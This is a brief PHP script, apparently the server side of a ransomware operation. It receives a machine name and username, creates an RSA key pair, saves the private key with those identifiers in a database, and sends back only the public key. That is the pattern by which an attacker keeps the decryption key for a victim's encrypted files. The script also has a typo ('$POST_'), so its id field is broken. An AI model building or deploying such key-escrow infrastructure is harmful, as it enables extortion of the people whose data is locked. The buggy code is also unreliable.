<?php


if(!isset($_POST) || empty($_POST['pcname'])) {
	exit;
}

set_include_path(get_include_path() . PATH_SEPARATOR . 'lib');


include 'lib/Crypt/RSA.php';


$rsa = new Crypt_RSA();
 
$rsa->setPrivateKeyFormat(CRYPT_RSA_PRIVATE_FORMAT_XML);
$rsa->setPublicKeyFormat(CRYPT_RSA_PUBLIC_FORMAT_XML);

extract($rsa->createKey(4096));

$id = $POST_['id'];
$pcname = $_POST['pcname']; 
$username = $_POST['username']; 

include 'db.php';
$stmt = $connection->prepare('INSERT INTO dummy (id, pcname, username, privatekey) VALUES (?, ?, ?, ?)');

$stmt->execute([
	$id,
	$pcname,
	$username,
	$privatekey
]);

echo $publickey;
